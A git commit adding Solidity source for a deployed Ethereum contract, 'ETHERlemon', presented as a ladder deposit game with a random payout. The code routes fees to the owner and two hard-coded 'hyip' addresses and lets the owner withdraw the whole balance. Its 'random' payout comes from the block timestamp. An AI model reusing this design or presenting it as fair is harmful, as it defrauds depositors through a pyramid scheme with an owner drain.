d00f64fe6070f32e44578f5c3d05237474ec04bc
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 23:54:43 +0700

    add contract ETHERlemon

---
+++ ETHERlemon.sol
@@ -0,0 +1,72 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ETHERlemon at 0x369f42e9a5368a3de984e862db8a14cea7cbf600
+*/
+/*
+Etherlemon - ethereum lemon.
+
+Ladder deposit contract based on EtheriumPyramidSample on GitHub.
+
+ETHERlemon allows to get random outcome in 0.0001 to 0.5 eth.
+
+*/
+contract ETHERlemon
+{
+
+    uint public paymentqueue = 0;
+    uint public feecounter;
+    
+    address public owner;
+    address public ipyh=0x5fD8B8237B6fA8AEDE4fdab7338709094d5c5eA4;
+    address public hyip=0xfAF7100b413465Ea0eB550d6D6a2A29695A6f218;
+    address meg=this;
+
+    modifier _onlyowner
+    {
+        if (msg.sender == owner)
+        _
+    }
+    
+    function ETHERlemon() 
+    {
+        owner = msg.sender;
+    }
+    function()       
+    {
+        enter();
+    }
+    function enter()
+    {
+        if (msg.sender == owner)
+	    {
+	        UpdatePay();                                          
+	    }
+	    else                                                          
+	    {
+            feecounter+=msg.value/10;                                  
+	        owner.send(feecounter/2);                           
+	        ipyh.send((feecounter/2)/2);                                 
+	        hyip.send((feecounter/2)/2);
+	        feecounter=0;                                            
+	        
+            if (msg.value == (1 ether)/10)                                
+            {
+                canPay();                                              
+            }
+	        else                                                         
+	        {
+	            msg.sender.send(msg.value - msg.value/10);                   
+	        }
+	    }
+
+    }
+    
+    function UpdatePay() _onlyowner                                            
+    {
+        msg.sender.send(meg.balance);
+    }
+    
+    function canPay() internal                                                  
+    {
+        msg.sender.send((block.timestamp*1000)*1000*40);  //set random payment
+    }
+}
